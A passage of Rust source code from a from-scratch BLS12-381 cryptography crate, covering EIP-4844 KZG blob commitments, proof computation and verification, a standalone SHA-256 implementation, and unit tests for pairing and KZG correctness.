    static SETUP: std::sync::OnceLock<Result<TrustedSetup, String>> = std::sync::OnceLock::new();
    SETUP
        .get_or_init(load_setup)
        .as_ref()
        .map_err(|e| e.clone())
}

/// 12-bit reversal (c-kzg brp over the 4096-subdomain).
pub fn bitrev12(i: usize) -> usize {
    let mut x = i & 0xfff;
    let mut r = 0;
    for _ in 0..12 {
        r = (r << 1) | (x & 1);
        x >>= 1;
    }
    r
}

/// Evaluation-domain root in the SCALAR field: ω = 7^((r-1)/4096), order 4096.
/// (c-kzg ROOT_OF_UNITY lives in blst_fr = Fr, not the base field.)
pub fn domain_root() -> Fr {
    static ROOT: std::sync::OnceLock<Fr> = std::sync::OnceLock::new();
    ROOT.get_or_init(|| {
        let g = Fr::from_u64(7);
        let e = (r_suborder() - 1u8) / BigUint::from(4096u64);
        g.pow(&e)
    })
    .clone()
}

/// BLS_MODULUS = subgroup order r (scalar field modulus), per EIP-4844.
pub fn bls_modulus() -> [u8; 32] {
    let m = r_suborder().to_bytes_be();
    let mut out = [0u8; 32];
    out[32 - m.len()..].copy_from_slice(&m);
    out
}

/// Interpret a 32-byte blob field element (scalar field, canonical < BLS_MODULUS = r).
pub fn bytes_to_field(bytes: &[u8]) -> Result<Fr, String> {
    Fr::from_be32_canonical(bytes)
}

/// Blob → evaluations at nodes ω^j in NATURAL order (transpose of c-kzg's brp).
pub fn blob_to_evaluations(blob: &[u8]) -> Result<Vec<Fr>, String> {
    if blob.len() != BLOB_SIZE {
        return Err(format!("blob must be {} bytes, got {}", BLOB_SIZE, blob.len()));
    }
    let mut evals = Vec::with_capacity(FIELD_ELEMENTS_PER_BLOB);
    for i in 0..FIELD_ELEMENTS_PER_BLOB {
        evals.push(bytes_to_field(&blob[32 * bitrev12(i)..32 * bitrev12(i) + 32])?);
    }
    Ok(evals)
}

/// KZG commitment to a blob: MSM over the natural-order Lagrange setup.
pub fn blob_to_kzg_commitment(blob: &[u8]) -> Result<[u8; 48], String> {
    let s = setup()?;
    let evals = blob_to_evaluations(blob)?;
    let scalars: Vec<BigUint> = evals.iter().map(|f| f.0.clone()).collect();
    let c = msm_g1(&s.g1_subgroup, &scalars);
    Ok(c.compress())
}

/// Batch inversion (Montgomery's trick): one inversion for n elements.
fn batch_inverse(vals: &[Fr]) -> Result<Vec<Fr>, String> {
    if vals.is_empty() {
        return Ok(vec![]);
    }
    let mut prefixes = Vec::with_capacity(vals.len());
    let mut acc = Fr::one();
    for v in vals {
        prefixes.push(acc.clone());
        acc = acc.mul(v);
    }
    let mut inv_last = acc.inv()?;
    let mut out = vec![Fr::one(); vals.len()];
    for i in (0..vals.len()).rev() {
        out[i] = inv_last.mul(&prefixes[i]);
        inv_last = inv_last.mul(&vals[i]);
    }
    Ok(out)
}

/// Barycentric evaluation of the blob polynomial at z (roots-of-unity domain).
pub fn evaluate_blob_polynomial(blob: &[u8], z: &Fr) -> Result<Fr, String> {
    let evals = blob_to_evaluations(blob)?;
    let n = FIELD_ELEMENTS_PER_BLOB as u64;
    let root = domain_root();
    let mut w_i = Fr::one();
    // denominators (z - ω^j); batch-invert (one field inversion total)
    let mut denoms = Vec::with_capacity(FIELD_ELEMENTS_PER_BLOB);
    let mut weights = Vec::with_capacity(FIELD_ELEMENTS_PER_BLOB);
    for a_i in &evals {
        let denom = z.sub(&w_i);
        if denom.is_zero() {
            return Ok(a_i.clone());
        }
        denoms.push(denom);
        weights.push(w_i.clone());
        w_i = w_i.mul(&root);
    }
    let dinv = batch_inverse(&denoms)?;
    let mut num = Fr::zero();
    for (w, (a_i, d)) in weights.iter().zip(evals.iter().zip(dinv.iter())) {
        num = num.add(&w.mul(a_i).mul(d));
    }
    // y = (z^n - 1)/n · Σ_j (ω^j · p(ω^j))/(z - ω^j)
    let zn = z.pow(&BigUint::from(n));
    let ninv = Fr::from_u64(n).inv()?;
    Ok(zn.sub(&Fr::one()).mul(&ninv).mul(&num))
}

/// Sidecar challenge (exact c-kzg derivation):
/// sha256("FSBLOBVERIFY_V1_" || 0u64be || 4096u64be || blob || commitment) mod r
fn blob_challenge(commitment: &[u8; 48], blob: &[u8]) -> Result<Fr, String> {
    const DOMAIN: &[u8; 16] = b"FSBLOBVERIFY_V1_";
    let mut buf = Vec::with_capacity(16 + 16 + blob.len() + 48);
    buf.extend_from_slice(DOMAIN);
    buf.extend_from_slice(&0u64.to_be_bytes());
    buf.extend_from_slice(&(FIELD_ELEMENTS_PER_BLOB as u64).to_be_bytes());
    buf.extend_from_slice(blob);
    buf.extend_from_slice(commitment);
    let h = kzg_sha256::sha256(&buf);
    Ok(Fr::from_be_bytes_reduced(&h))
}

/// Compute (y, proof) for a blob at challenge z.
pub fn compute_kzg_proof(blob: &[u8], z: &Fr) -> Result<([u8; 32], [u8; 48]), String> {
    let s = setup()?;
    let evals = blob_to_evaluations(blob)?;
    let y = evaluate_blob_polynomial(blob, z)?;
    // quotient on the domain: q(ω^j) = (p(ω^j) - y)/(ω^j - z) — batch-inverted
    let root = domain_root();
    let mut w_i = Fr::one();
    let mut denoms = Vec::with_capacity(FIELD_ELEMENTS_PER_BLOB);
    let mut numerators = Vec::with_capacity(FIELD_ELEMENTS_PER_BLOB);
    for a_i in &evals {
        let denom = w_i.sub(z);
        if denom.is_zero() {
            return Err("z is in the evaluation domain; quotient undefined at that node".into());
        }
        denoms.push(denom);
        numerators.push(a_i.sub(&y));
        w_i = w_i.mul(&root);
    }
    let dinv = batch_inverse(&denoms)?;
    let q_evals: Vec<Fr> = numerators
        .iter()
        .zip(dinv.iter())
        .map(|(n, d)| n.mul(d))
        .collect();
    let scalars: Vec<BigUint> = q_evals.iter().map(|f| f.0.clone()).collect();
    let proof = msm_g1(&s.g1_subgroup, &scalars);
    Ok((y.to_be32(), proof.compress()))
}

/// Sidecar proof for a blob against its commitment.
pub fn compute_blob_kzg_proof(blob: &[u8], commitment: &[u8; 48]) -> Result<[u8; 48], String> {
    let z = blob_challenge(commitment, blob)?;
    let (_y, proof) = compute_kzg_proof(blob, &z)?;
    Ok(proof)
}

/// Verify a KZG proof (pairing check) — the exact EIP-4844 verification equation.
pub fn verify_kzg_proof(
    commitment48: &[u8],
    z32: &[u8],
    y32: &[u8],
    proof48: &[u8],
) -> Result<bool, String> {
    if commitment48.len() != 48 || proof48.len() != 48 {
        return Err("commitment/proof must be 48 bytes".into());
    }
    if z32.len() != 32 || y32.len() != 32 {
        return Err("z/y must be 32 bytes".into());
    }
    let s = setup()?;
    let commitment = G1Affine::decompress(commitment48)?;
    let proof = G1Affine::decompress(proof48)?;
    let z = Fr::from_be32_canonical(z32)?;
    let y = Fr::from_be32_canonical(y32)?;
    Ok(kzg_pairing_check(
        &commitment,
        &z.0,
        &y.0,
        &proof,
        &s.g2_monomial[0],
        &s.g2_monomial[1],
    ))
}

/// Verify a full blob against its commitment + sidecar proof (mainnet path).
pub fn verify_blob_kzg_proof(blob: &[u8], commitment48: &[u8], proof48: &[u8]) -> Result<bool, String> {
    if commitment48.len() != 48 || proof48.len() != 48 {
        return Err("commitment/proof must be 48 bytes".into());
    }
    if blob.len() != BLOB_SIZE {
        return Err(format!("blob must be {} bytes, got {}", BLOB_SIZE, blob.len()));
    }
    let mut c = [0u8; 48];
    c.copy_from_slice(commitment48);
    let z = blob_challenge(&c, blob)?;
    let y = evaluate_blob_polynomial(blob, &z)?;
    verify_kzg_proof(commitment48, &z.to_be32(), &y.to_be32(), proof48)
}

/// Versioned blob hash: 0x01 || sha256(commitment)[1..32].
pub fn versioned_hash(commitment48: &[u8]) -> Result<[u8; 32], String> {
    if commitment48.len() != 48 {
        return Err("commitment must be 48 bytes".into());
    }
    let h = kzg_sha256::sha256(commitment48);
    let mut out = [0u8; 32];
    out[0] = 0x01;
    out[1..].copy_from_slice(&h[1..]);
    Ok(out)
}

/// Standalone SHA-256 (FIPS 180-4) so this crate has zero rrx dependencies.
pub mod kzg_sha256 {
    const K: [u32; 64] = [
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
    ];

    pub fn sha256(data: &[u8]) -> [u8; 32] {
        let mut h: [u32; 8] = [
            0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
        ];
        let mut msg = data.to_vec();
        let bitlen = (data.len() as u64) * 8;
        msg.push(0x80);
        while msg.len() % 64 != 56 {
            msg.push(0);
        }
        msg.extend_from_slice(&bitlen.to_be_bytes());
        for chunk in msg.chunks(64) {
            let mut w = [0u32; 64];
            for i in 0..16 {
                w[i] = u32::from_be_bytes([chunk[i * 4], chunk[i * 4 + 1], chunk[i * 4 + 2], chunk[i * 4 + 3]]);
            }
            for i in 16..64 {
                let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
                let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
                w[i] = w[i - 16].wrapping_add(s0).wrapping_add(w[i - 7]).wrapping_add(s1);
            }
            let (mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut hh) =
                (h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7]);
            for i in 0..64 {
                let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
                let ch = (e & f) ^ ((!e) & g);
                let t1 = hh.wrapping_add(s1).wrapping_add(ch).wrapping_add(K[i]).wrapping_add(w[i]);
                let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
                let maj = (a & b) ^ (a & c) ^ (b & c);
                let t2 = s0.wrapping_add(maj);
                hh = g;
                g = f;
                f = e;
                e = d.wrapping_add(t1);
                d = c;
                c = b;
                b = a;
                a = t1.wrapping_add(t2);
            }
            h[0] = h[0].wrapping_add(a);
            h[1] = h[1].wrapping_add(b);
            h[2] = h[2].wrapping_add(c);
            h[3] = h[3].wrapping_add(d);
            h[4] = h[4].wrapping_add(e);
            h[5] = h[5].wrapping_add(f);
            h[6] = h[6].wrapping_add(g);
            h[7] = h[7].wrapping_add(hh);
        }
        let mut out = [0u8; 32];
        for i in 0..8 {
            out[i * 4..i * 4 + 4].copy_from_slice(&h[i].to_be_bytes());
        }
        out
    }

    #[cfg(test)]
    mod tests {
        #[test]
        fn sha256_known() {
            assert_eq!(
                hex::encode(super::sha256(b"abc")),
                "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn versioned_hash_shape() {
        let c = [0xabu8; 48];
        let v = versioned_hash(&c).unwrap();
        assert_eq!(v[0], 0x01);
    }

    #[test]
    fn bitrev12_involution() {
        for i in 0..4096 {
            assert_eq!(bitrev12(bitrev12(i)), i);
        }
        assert_eq!(bitrev12(1), 2048);
    }

    #[test]
    fn domain_root_order() {
        let w = domain_root();
        assert_eq!(w.pow(&BigUint::from(4096u64)), Fr::one());
        assert_ne!(w.pow(&BigUint::from(2048u64)), Fr::one());
    }

    #[test]
    fn self_consistent_kzg_small() {
        if setup().is_err() {
            return;
        }
        let mut blob = vec![0u8; BLOB_SIZE];
        for (i, b) in blob.iter_mut().enumerate() {
            *b = ((i * 7 + 3) % 256) as u8;
        }
        for chunk in blob.chunks_mut(32) {
            chunk[0] &= 0x0f;
        }
        let c = blob_to_kzg_commitment(&blob).unwrap();
        let z = Fr::from_u64(12345);
        let (y, proof) = compute_kzg_proof(&blob, &z).unwrap();
        assert!(verify_kzg_proof(&c, &zb_from(&z), &y, &proof).unwrap(), "valid proof must verify");
        let mut bad_y = y;
        bad_y[31] ^= 1;
        assert!(!verify_kzg_proof(&c, &zb_from(&z), &bad_y, &proof).unwrap(), "tampered y must fail");
        // sidecar path consistency
        let side = compute_blob_kzg_proof(&blob, &c).unwrap();
        assert!(verify_blob_kzg_proof(&blob, &c, &side).unwrap(), "sidecar proof must verify");
    }

    fn zb_from(z: &Fr) -> [u8; 32] {
        z.to_be32()
    }
}
```

```rust
//! rrx-bls381: from-scratch BLS12-381 for rrx — Fp/Fp2/Fp6/Fp12 tower,
//! G1/G2, optimal ate pairing, Pippenger MSM, EIP-2537 encodings, KZG (EIP-4844).
//!
//! Validated against: official EIP-2537 test vectors + REAL mainnet blob
//! commitments/proofs (KZG) fetched live from the beacon chain ecosystem.

pub mod curve;
pub mod fp;
pub mod fp2;
pub mod fp612;
pub mod pairing;
pub mod kzg;

pub use curve::{
    g1_generator, g2_generator, G1Affine, G2Affine,
};
pub use fp::Fp;
pub use fp2::Fp2;
pub use fp612::{Fp12, Fp6};
pub use pairing::{pairing, pairing_product_is_one};

#[cfg(test)]
mod tests {
    use super::*;
    use crate::curve::msm_g2;
    use num_bigint::BigUint;

    /// e(a·G, H) == e(G, a·H) — bilinearity (small scalar, keeps test fast).
    #[test]
    fn pairing_bilinear_small() {
        let g = g1_generator();
        let h = g2_generator();
        let a = BigUint::from(3u32);
        let pa = g.mul(&a);
        let ha = h.mul(&a);
        let e1 = pairing(&pa, &h);
        let e2 = pairing(&g, &ha);
        assert_eq!(e1, e2);
        assert_ne!(e1, Fp12::one());
        // e(2P, Q) == e(P, 2Q)
        let e3 = pairing(&g.double(), &h);
        let e4 = pairing(&g, &h.double());
        assert_eq!(e3, e4);
    }

    /// e(P, Q) · e(-P, Q) == 1
    #[test]
    fn pairing_negation_cancels() {
        let g = g1_generator();
        let h = g2_generator();
        let e1 = pairing(&g, &h);
        let e2 = pairing(&g.neg(), &h);
        assert_eq!(e1.mul(&e2), Fp12::one());
        // e(P, -Q) == e(-P, Q)  (EIP-2537 required property)
        assert_eq!(pairing(&g, &h.neg()), pairing(&g.neg(), &h));
    }

    /// e(P, Q)^r == 1 (pairing lands in the r-th roots of unity)
    #[test]
    fn pairing_in_target_subgroup() {
        let g = g1_generator();
        let h = g2_generator();
        let e = pairing(&g, &h);
        assert_eq!(e.pow(&crate::fp::r_suborder()), Fp12::one());
    }

    /// MSM(2 points) == naive (G2 path)
    #[test]
    fn msm_g2_matches_naive() {
        let h = g2_generator();
        let pts = vec![h.clone(), h.double()];
        let scs = vec![BigUint::from(9u32), BigUint::from(4u32)];
        let fast = msm_g2(&pts, &scs);
        let naive = h.mul(&BigUint::from(9u32)).add(&h.double().mul(&BigUint::from(4u32)));
        assert_eq!(fast, naive);
    }
}
```
